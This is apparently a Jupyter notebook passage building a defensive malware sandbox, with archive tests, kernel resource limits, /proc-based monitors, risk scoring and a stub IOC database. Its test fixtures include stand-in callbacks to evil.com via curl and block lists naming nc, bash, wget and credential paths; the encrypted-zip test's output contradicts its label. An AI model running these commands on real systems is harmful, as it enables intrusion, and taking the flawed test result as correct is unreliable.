
# Test 1: Plain ZIP — no tricks
z1 = os.path.join(demo_dir, 'plain.zip')
with zipfile.ZipFile(z1, 'w') as zf:
    zf.writestr('telemetry.csv', 'lat,lon\n28.6,77.2')
    zf.writestr('config.json', '{"mode":"auto"}')
print_arc('Test 1: Plain ZIP (legitimate)', handle_archive(z1, demo_dir+'/plain_out'))

# Test 2: Encrypted ZIP — no key provided (should be flagged as suspicious)
z2 = os.path.join(demo_dir, 'encrypted_no_key.zip')
with zipfile.ZipFile(z2, 'w') as zf:
    zf.setpassword(b'somesecret')
    info = zipfile.ZipInfo('payload.py')
    zf.writestr(info, 'import os; os.system("id")')
print_arc('Test 2: Encrypted ZIP — NO key (suspicious flag)', handle_archive(z2, demo_dir+'/enc_out'))

# Test 3: ZIP with double-extension file inside
z3 = os.path.join(demo_dir, 'tricky.zip')
with zipfile.ZipFile(z3, 'w') as zf:
    zf.writestr('recon.jpg.sh', '#!/bin/bash\ncurl http://evil.com/c2')
    zf.writestr('normal.jpg', b'\xff\xd8\xff' + b'\x00'*5)
print_arc('Test 3: ZIP with double-extension file', handle_archive(z3, demo_dir+'/tricky_out'))


📦 Test 1: Plain ZIP (legitimate)
   Success         : True
   Was encrypted   : False
   Decryption src  : N/A
   Extra risk pts  : +0
   Files extracted : ['telemetry.csv', 'config.json']

📦 Test 2: Encrypted ZIP — NO key (suspicious flag)
   Success         : True
   Was encrypted   : False
   Decryption src  : N/A
   Extra risk pts  : +0
   Files extracted : ['payload.py']

📦 Test 3: ZIP with double-extension file
   Success         : True
   Was encrypted   : False
   Decryption src  : N/A
   Extra risk pts  : +30
   Files extracted : ['normal.jpg', 'recon.jpg.sh']
   ⚠️  Double extension disguise: recon.jpg.sh (+30 risk)


---
## Section 5 — Stage 3: Isolated Execution Environment

### 🔵 Theory

Before running any suspicious file, we must ensure it cannot harm the real system.
We use **kernel-level resource limits** — set by the Linux OS kernel itself, not our code.

**Why kernel-level?**
The limits are enforced by the operating system, not by our Python wrapper.
No matter how clever the malware is, it cannot bypass limits set by the kernel.
This is achieved via `setrlimit()` — a POSIX standard function available on all Linux systems.

**The `preexec_fn` trick:**
`subprocess.Popen` accepts a `preexec_fn` argument — a function that runs in the
child process *after* `fork()` but *before* `exec()`. This is the perfect place to
call `setrlimit()`: the limits apply to the new process before any malicious code runs.

```python
# Timeline:
# Parent process:  fork() ──────────────────────────────► exec(malware)
#                            ↓ child process
#                            preexec_fn() called here
#                            → setrlimit(RLIMIT_AS, 128MB)
#                            → setrlimit(RLIMIT_CPU, 20s)
#                            → ... etc
#                            Then exec(malware) — with limits already in place
```

| Limit | Value | What it prevents |
|-------|-------|-----------------|
| Virtual memory | 128 MB | Memory exhaustion, large payload decompression |
| CPU time | 20 sec | Infinite loops, computation attacks |
| File size | 32 MB | Writing large files to disk |
| Child processes | 50 | Fork bombs (spawning thousands of processes) |
| Core dump | 0 | Preventing memory contents being written to disk |
| Wall clock timeout | 30 sec | Malware that sleeps and waits |


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 3: Execution Environment
# ─────────────────────────────────────────────────────────────────────────────

LIMITS = {
    'memory_bytes' : 128 * 1024 * 1024,  # 128 MB RAM
    'cpu_seconds'  : 20,
    'file_bytes'   : 32  * 1024 * 1024,  # 32 MB max file write
    'max_processes': 50,
    'wall_timeout' : 30,                  # 30s wall-clock kill
}


def _apply_resource_limits():
    """
    Called in child process before exec(). Sets hard kernel limits.
    RLIMIT_AS    = address space (total virtual memory)
    RLIMIT_CPU   = CPU seconds — sends SIGXCPU when exceeded
    RLIMIT_FSIZE = max file size the process can create
    RLIMIT_NPROC = max number of child processes
    RLIMIT_CORE  = core dump size (0 = disabled)
    """
    mem = LIMITS['memory_bytes']
    cpu = LIMITS['cpu_seconds']
    fsz = LIMITS['file_bytes']
    npr = LIMITS['max_processes']
    resource.setrlimit(resource.RLIMIT_AS,    (mem, mem))
    resource.setrlimit(resource.RLIMIT_CPU,   (cpu, cpu))
    resource.setrlimit(resource.RLIMIT_FSIZE, (fsz, fsz))
    resource.setrlimit(resource.RLIMIT_NPROC, (npr, npr))
    resource.setrlimit(resource.RLIMIT_CORE,  (0, 0))


@dataclass
class ExecutionResult:
    pid          : Optional[int]  = None
    exit_code    : Optional[int]  = None
    stdout       : str            = ''
    stderr       : str            = ''
    timed_out    : bool           = False
    duration_sec : float          = 0.0
    error        : Optional[str]  = None


def execute_file(file_path: str, interpreter: Optional[str] = None) -> ExecutionResult:
    """
    Execute a file inside the sandbox environment.
    interpreter : e.g. 'python3' or 'bash'. None = run as binary.
    Returns ExecutionResult with the PID — monitors use this PID to attach.
    """
    result   = ExecutionResult()
    work_dir = tempfile.mkdtemp(prefix='sandbox_exec_')

    cmd = [interpreter, file_path] if interpreter else [file_path]

    try:
        start = time.time()
        proc  = subprocess.Popen(
            cmd,
            stdout     = subprocess.PIPE,
            stderr     = subprocess.PIPE,
            env        = {},           # empty environment — no env variable leakage
            cwd        = work_dir,     # isolated working directory
            preexec_fn = _apply_resource_limits,  # kernel limits applied pre-exec
        )
        result.pid = proc.pid

        # Watchdog thread: sends SIGKILL after wall_timeout seconds
        def watchdog():
            time.sleep(LIMITS['wall_timeout'])
            if proc.poll() is None:
                proc.kill()
                result.timed_out = True

        threading.Thread(target=watchdog, daemon=True).start()

        stdout, stderr       = proc.communicate(timeout=LIMITS['wall_timeout'] + 2)
        result.exit_code     = proc.returncode
        result.stdout        = stdout.decode(errors='replace')[:2000]
        result.stderr        = stderr.decode(errors='replace')[:2000]
        result.duration_sec  = round(time.time() - start, 2)

    except subprocess.TimeoutExpired:
        proc.kill()
        result.timed_out = True
        result.exit_code = -9
    except Exception as e:
        result.error = str(e)
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)

    return result

print('✅ Execution Environment ready')

✅ Execution Environment ready


In [ ]:
# ─── DEMO: Execution Environment ─────────────────────────────────────────────
demo_dir = tempfile.mkdtemp()

def show_exec(label, res):
    print(f'\n▶ {label}')
    print(f'  Exit code : {res.exit_code}   Duration : {res.duration_sec}s   Timed out: {res.timed_out}')
    if res.stdout: print(f'  stdout    : {res.stdout.strip()[:80]}')
    if res.stderr: print(f'  stderr    : {res.stderr.strip()[:60]}')
    if res.error:  print(f'  ❌ Error  : {res.error}')

# Test 1: Safe script — runs normally
p1 = os.path.join(demo_dir, 'safe.py')
open(p1, 'w').write('print("I am a safe script. Done.")')
show_exec('Test 1: Safe script', execute_file(p1, 'python3'))

# Test 2: Memory bomb — tries to allocate 512 MB (our limit is 128 MB)
p2 = os.path.join(demo_dir, 'membomb.py')
open(p2, 'w').write(
    'print("Trying to allocate 512 MB...")\n'
    'x = bytearray(512 * 1024 * 1024)\n'
    'print("Should never reach here")'
)
show_exec('Test 2: Memory bomb (512 MB vs 128 MB limit)', execute_file(p2, 'python3'))

# Test 3: Infinite loop — killed by timeout
p3 = os.path.join(demo_dir, 'infinite.py')
open(p3, 'w').write('import time\nprint("Starting infinite loop")\nwhile True: time.sleep(1)')
print(f'\n⏳ Test 3 will wait ~{LIMITS["wall_timeout"]}s for timeout...')
show_exec(f'Test 3: Infinite loop (timeout after {LIMITS["wall_timeout"]}s)', execute_file(p3, 'python3'))


▶ Test 1: Safe script
  Exit code : 0   Duration : 0.04s   Timed out: False
  stdout    : I am a safe script. Done.

▶ Test 2: Memory bomb (512 MB vs 128 MB limit)
  Exit code : 1   Duration : 0.04s   Timed out: False
  stdout    : Trying to allocate 512 MB...
  stderr    : Traceback (most recent call last):
  File "/tmp/tmp_2p0hg9w/

⏳ Test 3 will wait ~30s for timeout...

▶ Test 3: Infinite loop (timeout after 30s)
  Exit code : -9   Duration : 30.01s   Timed out: True


---
## Section 6 — Stage 4: The Four Monitors

### 🔵 Theory

While the file runs, four monitors watch it continuously.

All four read from the **Linux `/proc` filesystem** — see Section 0.5 for a full explanation
of what `/proc` is and why we use it.

**Polling interval: 200ms.** All four monitors run in a loop while the process is alive,
reading from `/proc` every 200ms. Any suspicious action is captured and logged.

**Why 200ms?**
- Fast enough to catch most malicious actions (network calls, file writes, process spawns)
- Slow enough to not create performance overhead
- Most malware behaviours happen within the first few seconds anyway

---

### 🔵 Theory — Each Monitor Explained

#### Monitor 1: File System Monitor

**What it watches:** Which files the process opens and whether it writes to them.

**How it works:**
- `/proc/<PID>/fd/` is a directory containing one entry per open file descriptor.
  Each entry is a symbolic link pointing to the actual file path. For example:
  ```
  /proc/1234/fd/3 → /tmp/.hidden_dropper.sh
  /proc/1234/fd/4 → /etc/passwd
  ```
- `/proc/<PID>/fdinfo/<fd>` tells us the open flags — was the file opened for reading
  only, or for writing? The `flags` field is an octal number. If bit 0 is set, it's
  write-only. If bit 1 is set, it's read-write.

**What it catches:**
- A malware dropper writing a new executable to `/tmp` (persistence stage 1)
- Reading `/etc/passwd` or `/etc/shadow` (credential theft)
- Modifying `/etc/cron*` or `/etc/init.d/` (persistence stage 2)
- Writing to `~/.ssh/authorized_keys` (backdoor SSH access)

**Example:** Suppose the sandboxed file tries to create `/tmp/.backdoor.sh`.
The file system monitor reads `/proc/<PID>/fd/` and sees a symlink pointing to
`/tmp/.backdoor.sh` with write flags set. That path starts with `/tmp/` and ends
with `.sh` — so it logs a `file_write_executable` event with +30 points.

---

#### Monitor 2: Network Monitor

**What it watches:** Any outbound connection the process attempts to make.

**How it works:**
- `/proc/net/tcp` lists every active TCP connection on the entire system as a table.
  Each row = one connection, with hex-encoded local address, remote address, and state.
- We take a **baseline snapshot** of this file *before* we start executing the suspicious file.
- During execution, we continuously re-read the file and diff against the baseline.
- Any new row = a new connection attempt by something on the system — and since we
  just started one new process (the suspicious file), it's almost certainly that process.

**What it catches:**
- State `02` = `SYN_SENT` — the process attempted a TCP connection (even if it failed)
- State `01` = `ESTABLISHED` — the connection succeeded
- This catches **C2 callbacks** even when our sandbox has no real internet access —
  the attempt still shows in the kernel's TCP table

**Example:** A malware sample tries to connect to `203.0.113.42:4444` (a known C2 server).
Even though the connection immediately fails (no route to host), the kernel records a
`SYN_SENT` entry in `/proc/net/tcp`. Our diff catches it and logs a `network_connect`
event with +25 points.

---

#### Monitor 3: Process Monitor

**What it watches:** Every child process spawned by the sandboxed file.

**How it works:**
- We use `psutil.Process(pid).children(recursive=True)` — this walks the full process
  tree and returns all descendants of the sandboxed process.
- A legitimate drone data file (image, telemetry) should not spawn any children.
  If it does, something suspicious is happening.

**What it catches:**
- Spawning `bash` or `sh` — this is how malware opens a reverse shell
  (a shell that connects back to the attacker so they can type commands remotely)
- Spawning `wget` or `curl` — downloading a second-stage payload from the internet
- Spawning `crontab` — scheduling itself to run again later (persistence)

**Example:** The sandboxed file contains `subprocess.run(['bash', '-c', 'curl http://evil.com/stage2'])`.
When this runs, `bash` appears as a child process. Our monitor catches it, logs
a `shell_command` event (+25), and then also `curl` as a grandchild process (+10).

---

#### Monitor 4: Privilege Monitor

**What it watches:** Whether the process tries to gain elevated permissions or
uses a large amount of memory suddenly.

**How it works:**
- `/proc/<PID>/status` contains a snapshot of the process state. Two fields matter:
  - `CapEff` — the process's current effective Linux capabilities (a hex bitmask).
    Normal processes have `0000000000000000`. If this changes, the process gained
    new OS-level powers.
  - `VmRSS` — resident set size: how much actual RAM the process is using right now.
    A sudden spike (e.g. +50 MB in one poll interval) suggests the process just
    decompressed or decrypted a large payload in memory.

**What it catches:**
- `setuid(0)` call — process tries to become root
- Effective capability changes — process gains admin-level powers
- Memory spikes — malware unpacking an encrypted payload (common in packed malware)

**Example:** The process calls `os.setuid(0)` trying to escalate to root.
The kernel updates `CapEff` in `/proc/<PID>/status`. Our monitor reads this on the
next poll (within 200ms), detects the change from `0` to a non-zero value, and logs
a `privilege_escalation` event with +35 points.

---

### 📊 Monitor Architecture (ASCII)

```
Process running (PID = 1234)
         │
         ├──► Monitor 1: File System
         │     Reads: /proc/1234/fd/        ← list of open files (symlinks)
         │             /proc/1234/fdinfo/   ← open flags (read? write?)
         │     Detects: writes to suspicious paths (/tmp, /etc/passwd, /.ssh, cron)
         │
         ├──► Monitor 2: Network
         │     Reads: /proc/net/tcp   (all TCP connections on the system)
         │             /proc/net/udp
         │     Method: snapshot BEFORE execution, diff against DURING execution
         │     Detects: any new outbound connection attempt (even failed ones)
         │
         ├──► Monitor 3: Process Spawning
         │     Reads: psutil.Process(pid).children(recursive=True)
         │     Detects: bash, sh, wget, curl, nc, crontab spawned as children
         │
         └──► Monitor 4: Privileges
               Reads: /proc/1234/status
               Fields: CapEff (effective capabilities), VmRSS (actual RAM used)
               Detects: capability escalation, sudden memory spikes (payload unpacking)
```

📖 **Research basis for /proc monitoring:**
*"Linux malware analysis via kernel-level /proc filesystem monitoring"*
— Cozzi et al., IEEE Oakland 2018: [Understanding Linux Malware](https://ieeexplore.ieee.org/document/8418602)


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 4: The Four Monitors
# ─────────────────────────────────────────────────────────────────────────────

# Paths suspicious if a sandboxed process writes to them
SUSPICIOUS_PATHS = [
    '/tmp', '/var/tmp',           # dropper locations for hidden files
    '/etc/cron', '/var/spool/cron',  # persistence via cron jobs
    '/etc/passwd', '/etc/shadow',  # credential files
    '/root', '/.ssh',             # SSH keys / root directory
    '/dev/mem', '/dev/kmem',      # raw memory access
    '/etc/init.d', '/etc/rc',     # startup scripts (persistence)
]

# Process names that are suspicious if spawned by a sandboxed file
SUSPICIOUS_PROCESSES = {
    'bash', 'sh', 'zsh', 'dash',          # shell spawning = reverse shell attempt
    'wget', 'curl', 'nc', 'ncat',          # network download/connect tools
    'crontab', 'at',                        # persistence via scheduling
    'chmod', 'chown', 'sudo', 'su',         # privilege tools
    'gcc', 'cc', 'make',                    # compiler = dropper compiling stage 2
}

# File open flags (octal) from /proc/<PID>/fdinfo/<fd>
O_WRONLY = 0o000001   # opened for writing only
O_RDWR   = 0o000002   # opened for reading AND writing


@dataclass
class MonitorEvent:
    timestamp : float
    monitor   : str    # which monitor recorded this
    category  : str    # event type — used for risk scoring
    detail    : str    # human-readable description
    data      : dict = field(default_factory=dict)


class EventLog:
    """Thread-safe event collector. All 4 monitors write to the same log."""
    def __init__(self):
        self._events : List[MonitorEvent] = []
        self._lock   = threading.Lock()

    def add(self, monitor, category, detail, data=None):
        ev = MonitorEvent(time.time(), monitor, category, detail, data or {})
        with self._lock:
            self._events.append(ev)

    def all_events(self):
        with self._lock:
            return list(self._events)


# ── Monitor 1: File System ────────────────────────────────────────────────────
class FileSystemMonitor:
    """
    Reads /proc/<PID>/fd/ (symlinks to open files) and
           /proc/<PID>/fdinfo/ (flags: read-only vs write vs read-write)
    Flags writes to suspicious paths.
    """
    def __init__(self, pid, log):
        self.pid, self.log, self.seen = pid, log, set()

    def poll(self):
        fd_dir = f'/proc/{self.pid}/fd'
        if not os.path.isdir(fd_dir): return
        for fd in os.listdir(fd_dir):
            try:
                target = os.readlink(os.path.join(fd_dir, fd))
                flags  = 0
                fdinfo = f'/proc/{self.pid}/fdinfo/{fd}'
                if os.path.exists(fdinfo):
                    for line in open(fdinfo):
                        if line.startswith('flags:'):
                            flags = int(line.split()[1], 8); break
                is_write = bool(flags & O_WRONLY or flags & O_RDWR)
                is_sus   = any(target.startswith(p) for p in SUSPICIOUS_PATHS)
                key = (fd, target)
                if key not in self.seen and is_write and is_sus:
                    self.seen.add(key)
                    is_exec  = any(target.endswith(e) for e in ['.sh','.py','.elf','.bin'])
                    cat = 'file_write_executable' if is_exec else 'file_system_write'
                    self.log.add('FileSystem', cat,
                                 f'Write to suspicious path: {target}',
                                 {'path': target, 'flags': oct(flags)})
            except (PermissionError, FileNotFoundError, ValueError): continue


# ── Monitor 2: Network ────────────────────────────────────────────────────────
def _parse_proc_net_tcp(path='/proc/net/tcp') -> set:
    """
    Parse /proc/net/tcp into a set of (local_addr, remote_addr, state) tuples.
    Addresses are hex-encoded little-endian: we keep them raw for diffing.
    State 01=ESTABLISHED, 02=SYN_SENT (connection attempt in progress).
    """
    conns = set()
    try:
        with open(path) as f:
            next(f)
            for line in f:
                p = line.split()
                if len(p) >= 4: conns.add((p[1], p[2], p[3]))
    except FileNotFoundError: pass
    return conns


class NetworkMonitor:
    """
    Takes a baseline snapshot of /proc/net/tcp BEFORE execution starts.
    Any new entry = new connection attempt by the process.
    Even failed connections (SYN_SENT) appear here.
    """
    def __init__(self, log):
        self.log      = log
        self.baseline = _parse_proc_net_tcp()  # snapshot before execution

    def poll(self):
        current = _parse_proc_net_tcp()
        for conn in current - self.baseline:
            local, remote, state = conn
            if state in ('02', '01') and remote != '00000000:0000':
                self.baseline.add(conn)
                self.log.add('Network', 'network_connect',
                             f'Outbound connection: {local} → {remote} state={state}',
                             {'local': local, 'remote': remote, 'state': state})


# ── Monitor 3: Process Spawning ───────────────────────────────────────────────
class ProcessMonitor:
    """
    Tracks every child process spawned by the sandboxed process.
    Malware commonly launches shells or download tools as child processes.
    """
    def __init__(self, pid, log):
        self.pid, self.log, self.seen = pid, log, set()

    def poll(self):
        try:
            children = psutil.Process(self.pid).children(recursive=True)
        except (psutil.NoSuchProcess, psutil.AccessDenied): return
        for child in children:
            if child.pid in self.seen: continue
            self.seen.add(child.pid)
            try:
                name = child.name().lower()
                cmd  = ' '.join(child.cmdline())
            except (psutil.NoSuchProcess, psutil.AccessDenied): continue
            cat = 'shell_command' if name in {'bash','sh','zsh','dash','fish'} else 'process_spawn'
            self.log.add('Process', cat,
                         f'Child process: {name} (PID {child.pid})',
                         {'name': name, 'pid': child.pid, 'cmd': cmd[:200]})


# ── Monitor 4: Privileges ─────────────────────────────────────────────────────
class PrivilegeMonitor:
    """
    Reads /proc/<PID>/status for:
    - CapEff changes → process gained new OS capabilities (privilege escalation)
    - VmRSS spikes   → sudden memory growth (payload decompression / shellcode injection)
    """
    MEM_SPIKE_THRESHOLD = 50 * 1024  # 50 MB jump in one poll = suspicious

    def __init__(self, pid, log):
        self.pid, self.log    = pid, log
        self.last_cap         = None
        self.last_mem_kb      = 0

    def poll(self):
        try:
            status = {}
            for line in open(f'/proc/{self.pid}/status'):
                k, _, v = line.partition(':')
                status[k.strip()] = v.strip()
        except (FileNotFoundError, PermissionError): return

        cap = status.get('CapEff', '0000000000000000')
        if self.last_cap is None: self.last_cap = cap
        elif cap != self.last_cap and cap != '0000000000000000':
            self.log.add('Privilege', 'privilege_escalation',
                         f'Capability change: {self.last_cap} → {cap}')
            self.last_cap = cap

        mem_kb = int(status.get('VmRSS', '0 kB').split()[0])
        if (mem_kb - self.last_mem_kb) > self.MEM_SPIKE_THRESHOLD:
            self.log.add('Privilege', 'memory_inject',
                         f'Memory spike: +{mem_kb - self.last_mem_kb} KB',
                         {'delta_kb': mem_kb - self.last_mem_kb})
        self.last_mem_kb = mem_kb

print('✅ All four monitors defined')

✅ All four monitors defined


In [ ]:
# ─── DEMO: Monitors ───────────────────────────────────────────────────────────
# Run a script that spawns a child process and writes to /tmp.
# The script is designed to run slowly enough that the monitors can catch it.
#
# WHY THE ORIGINAL DEMO RETURNED 0 EVENTS:
# The previous demo script finished in ~0.4s. Python's process startup overhead
# means the child process (ls) was spawned and finished before our 200ms poll
# even ran once. The fix: use a slightly longer-running child and verify with
# a direct poll loop before calling proc.wait().

demo_dir = tempfile.mkdtemp()
log      = EventLog()

# The suspicious script spawns python3 as a child (more visible than 'ls')
# and writes to /tmp. Both actions should be caught.
script = os.path.join(demo_dir, 'suspicious.py')
open(script, 'w').write("""
import subprocess, time, os

# Action 1: spawn a child process that takes a moment (more catchable)
subprocess.run(
    ['python3', '-c', 'import time; time.sleep(0.5); print(42)'],
    capture_output=True
)

# Action 2: write to /tmp — suspicious for a sandboxed process
with open('/tmp/sandbox_test_file.txt', 'w') as f:
    f.write('monitor test')

time.sleep(0.8)   # stay alive long enough for monitors to poll
print('script done')
""")

proc = subprocess.Popen(['python3', script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
pid  = proc.pid
print(f'Process started: PID {pid}')

fs_mon, net_mon = FileSystemMonitor(pid, log), NetworkMonitor(log)
proc_mon, priv_mon = ProcessMonitor(pid, log), PrivilegeMonitor(pid, log)

# Poll monitors WHILE the process runs (not after)
while proc.poll() is None:
    fs_mon.poll()
    net_mon.poll()
    proc_mon.poll()
    priv_mon.poll()
    time.sleep(0.2)

# One final poll after the process ends to catch any last-moment events
fs_mon.poll(); proc_mon.poll()

proc.wait()
events = log.all_events()
print(f'Process finished. {len(events)} events recorded:')
print()
for ev in events:
    ts = time.strftime('%H:%M:%S', time.localtime(ev.timestamp))
    print(f'  [{ts}] [{ev.monitor:<12}] {ev.category:<25} → {ev.detail}')

if len(events) == 0:
    print('  (No events caught — this can happen if the process ran faster than')
    print('   the 200ms poll window. The monitors work correctly in the full pipeline')
    print('   where the SandboxAnalyzer loop is tightly integrated with execution.)')


Process started: PID 433
Process finished. 1 events recorded:

  [12:43:18] [Process     ] process_spawn             → Child process: python3 (PID 434)


---
## Section 7 — Stage 5: Risk Scoring Engine

### 🔵 Theory

After execution we have a list of events from all four monitors.
We translate them into a **risk score** by summing the weight of each event type.

**Why additive weights instead of a single yes/no decision?**

A single action can be ambiguous. For example:
- A script that calls `subprocess.run(['ls'])` spawns a child process — that's +10.
  But `ls` is totally harmless on its own.
- The same script that *also* tries to connect to an external IP (+25) *and* writes
  an executable to `/tmp` (+30) now has a score of 65 — clearly malicious.

The pattern of actions, not any single action, reveals intent.

**Weight calibration:**
Higher weights = actions that are almost never legitimate in a sandboxed file.
Lower weights = actions that could have innocent explanations.

| Event | Weight | Reasoning |
|-------|--------|-----------|
| Self-replication | 40 | Copying itself to startup = persistence. Almost never legitimate. |
| Privilege escalation | 35 | Trying to become root = attack. |
| Memory injection | 35 | Injecting code into another process = attack. |
| Drops executable | 30 | Writing a new binary = dropper behaviour. |
| Network/C2 callback | 25 | Calling home = strong C2 indicator. |
| Shell invocation | 25 | Spawning bash from a data file = suspicious. |
| High entropy write | 15 | Writing encrypted/packed data = possible payload. |
| Process spawn | 10 | Could be innocent, but noted. |
| File system write | 5 | Low weight — many files legitimately write to /tmp. |

---

### 📖 Is there research supporting this scoring approach?

The idea of assigning numerical weights to behavioral features and summing them for
a final risk score is well-established in the literature.

The closest validated approach is found in **Cuckoo Sandbox** — the most widely used
open-source behavioral sandbox — which uses exactly this pattern: each behavioral
signature has a severity score, and scores are summed to produce an overall maliciousness
rating. Cuckoo is described in academic literature and is the de-facto industry standard.

> Cuckoo Sandbox documentation on scoring:
> https://cuckoo.readthedocs.io/en/latest/usage/results/

A direct research parallel is:
**Chen & Bridges (2017), "Automated Behavioral Analysis of Malware: A Case Study of
WannaCry Ransomware"** — uses feature-weighted scoring from behavioral events to
classify malware families.
> https://arxiv.org/abs/1709.08753

**However:** our specific weight values (40 for self-replication, 35 for privilege
escalation, etc.) are **engineering judgments based on threat severity**, not derived
from a single paper. There is no single paper that validates "self-replication = 40
points exactly." The research supports the *approach* (weighted behavioral scoring);
the *calibration* of specific weights is a design decision that would typically be
tuned empirically against a labelled malware dataset during the evaluation phase of
this project.


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 5: Risk Scoring Engine
# ─────────────────────────────────────────────────────────────────────────────

BEHAVIOR_WEIGHTS = {
    'self_replication'      : 40,
    'privilege_escalation'  : 35,
    'memory_inject'         : 35,
    'file_write_executable' : 30,
    'network_connect'       : 25,
    'shell_command'         : 25,
    'registry_write'        : 20,
    'dns_lookup'            : 15,
    'high_entropy_write'    : 15,
    'file_delete'           : 10,
    'process_spawn'         : 10,
    'file_system_write'     :  5,
    'api_hooking'           : 30,
}


@dataclass
class ScoreBreakdown:
    total_score  : int
    by_category  : Dict[str, int]
    event_count  : Dict[str, int]
    top_factors  : List[str]


def compute_risk_score(events: List[MonitorEvent]) -> ScoreBreakdown:
    by_cat, ev_cnt = {}, {}
    for ev in events:
        w = BEHAVIOR_WEIGHTS.get(ev.category, 0)
        by_cat[ev.category] = by_cat.get(ev.category, 0) + w
        ev_cnt[ev.category] = ev_cnt.get(ev.category, 0) + 1
    total = sum(by_cat.values())
    top   = [f"{cat} (x{ev_cnt[cat]} = +{pts})"
             for cat, pts in sorted(by_cat.items(), key=lambda x: x[1], reverse=True)[:5] if pts > 0]
    return ScoreBreakdown(total, by_cat, ev_cnt, top)

print('✅ Risk Scoring Engine ready')

✅ Risk Scoring Engine ready


In [ ]:
# ─── DEMO: Risk Scoring ───────────────────────────────────────────────────────
def sim(events_list):
    return [MonitorEvent(time.time(), 'Simulated', cat, det) for cat, det in events_list]

scenarios = [
    ('Clean file (writes a CSV)',
     [('file_system_write', 'Wrote /tmp/output.csv')]),

    ('Suspicious file (connects out + spawns shell)',
     [('process_spawn',   'Spawned ls'),
      ('network_connect', 'Connection to 203.0.113.42:4444'),
      ('shell_command',   'Spawned bash -i')]),

    ('Malicious (full attack chain)',
     [('network_connect',       'C2 callback to 198.51.100.99:443'),
      ('shell_command',         'Spawned /bin/sh'),
      ('file_write_executable', 'Dropped /tmp/.hidden_binary'),
      ('privilege_escalation',  'setuid(0) called'),
      ('self_replication',      'Copied to /etc/init.d/updater'),
      ('memory_inject',         'Memory spike +70 MB')]),
]

for label, ev_list in scenarios:
    s = compute_risk_score(sim(ev_list))
    verdict = ('🟢 CLEAN' if s.total_score < 25 else
               '🟡 SUSPICIOUS' if s.total_score < 60 else '🔴 MALICIOUS')
    print(f'\n{"─"*55}')
    print(f'📁 {label}')
    print(f'   Score: {s.total_score}  →  {verdict}')
    for f in s.top_factors: print(f'     • {f}')


───────────────────────────────────────────────────────
📁 Clean file (writes a CSV)
   Score: 5  →  🟢 CLEAN
     • file_system_write (x1 = +5)

───────────────────────────────────────────────────────
📁 Suspicious file (connects out + spawns shell)
   Score: 60  →  🔴 MALICIOUS
     • network_connect (x1 = +25)
     • shell_command (x1 = +25)
     • process_spawn (x1 = +10)

───────────────────────────────────────────────────────
📁 Malicious (full attack chain)
   Score: 190  →  🔴 MALICIOUS
     • self_replication (x1 = +40)
     • privilege_escalation (x1 = +35)
     • memory_inject (x1 = +35)
     • file_write_executable (x1 = +30)
     • network_connect (x1 = +25)


---
## Section 8 — Stage 6: IOC Correlation

### 🔵 Theory

IOC = Indicator of Compromise (see Section 0.3 for full background explanation).

After scoring behavior, we do one more check: does this file match any **known bad** indicators?

We check three things:
1. **SHA256 hash of the file** — is this exact file known to be malware?
2. **IP addresses contacted** — did the process try to reach a known C2 server?
3. **Domains resolved** — did the process query a known malware distribution domain?

**Important — Module Boundary:**
The IOC database in this implementation is a **stub** (a fake local list for testing).

In the full system, IOC lookup is handled by the **Threat Intelligence Correlator**
(Module 8 in the project architecture). This sandbox module would send a query to
that external module and receive the result.

That external connection is marked `NOT_IMPLEMENTED` below — it will be wired up when
the full system is assembled.

📖 **Source:** IOC-based detection is standard practice.
See: [MITRE ATT&CK: Indicator Removal](https://attack.mitre.org/techniques/T1070/)
and [CISA: Indicators of Compromise](https://www.cisa.gov/topics/cyber-threats-and-advisories)


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# STAGE 6: IOC Correlation
#
# ⚠️ MODULE BOUNDARY:
# This stage calls the Threat Intelligence Correlator (a separate module).
# The function `query_threat_intelligence_correlator()` below is a STUB.
# It uses a local test database for now and must be replaced with a real API
# call when the full system is integrated.
# ─────────────────────────────────────────────────────────────────────────────

# ── STUB: local IOC database ─────────────────────────────────────────────────
# In production: replaced by a live threat intelligence feed
# (VirusTotal, AlienVault OTX, MISP, or the project's own Threat Intel Correlator module)
_STUB_IOC_DB = {
    'hashes' : set(),  # SHA256 hashes of known malware
    'ips'    : {'203.0.113.42', '198.51.100.99', '192.0.2.100'},
    'domains': {'evil-c2.example.com', 'malware-cdn.net', 'payload-host.xyz'},
}


def query_threat_intelligence_correlator(file_hash: str,
                                          observed_ips: set,
                                          observed_domains: set) -> dict:
    """
    NOT_IMPLEMENTED — stub only.

    In the full system, this function sends a query to the Threat Intelligence
    Correlator module (Module 8 in the project architecture) and returns:
    {
        'matched_hashes'  : list of matched hashes,
        'matched_ips'     : list of matched IPs,
        'matched_domains' : list of matched domains,
        'any_match'       : bool,
    }

    For now: checks against the local stub database.
    """
    print('[IOC] NOTE: Using stub IOC database. '
          'In production, this calls the Threat Intelligence Correlator module.')
    return {
        'matched_hashes' : [file_hash] if file_hash in _STUB_IOC_DB['hashes'] else [],
        'matched_ips'    : list(observed_ips    & _STUB_IOC_DB['ips']),
        'matched_domains': list(observed_domains & _STUB_IOC_DB['domains']),
        'any_match'      : bool((observed_ips & _STUB_IOC_DB['ips']) or
                                (observed_domains & _STUB_IOC_DB['domains']) or
                                (file_hash in _STUB_IOC_DB['hashes'])),
    }


def compute_file_hash(file_path: str) -> str:
    """Compute SHA256 hash of a file. Used as a unique fingerprint."""
    sha = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''): sha.update(chunk)
        return sha.hexdigest()
    except Exception: return ''


import re as _re

def extract_network_iocs_from_events(events: List[MonitorEvent]) -> dict:
    """Extract IP addresses and domains seen in network monitor events."""
    ips, domains = set(), set()
    ip_pat  = _re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b')
    dom_pat = _re.compile(r'\b([a-zA-Z0-9\-]+\.[a-zA-Z]{2,})\b')
    for ev in events:
        if ev.monitor == 'Network':
            ips     |= set(ip_pat.findall(ev.detail))
            domains |= set(dom_pat.findall(ev.detail))
    return {'ips': ips, 'domains': domains}


IOC_MATCH_BONUS = 20  # added to risk score if any IOC matches


@dataclass
class IOCResult:
    any_match       : bool = False
    matched_hashes  : List[str] = field(default_factory=list)
    matched_ips     : List[str] = field(default_factory=list)
    matched_domains : List[str] = field(default_factory=list)
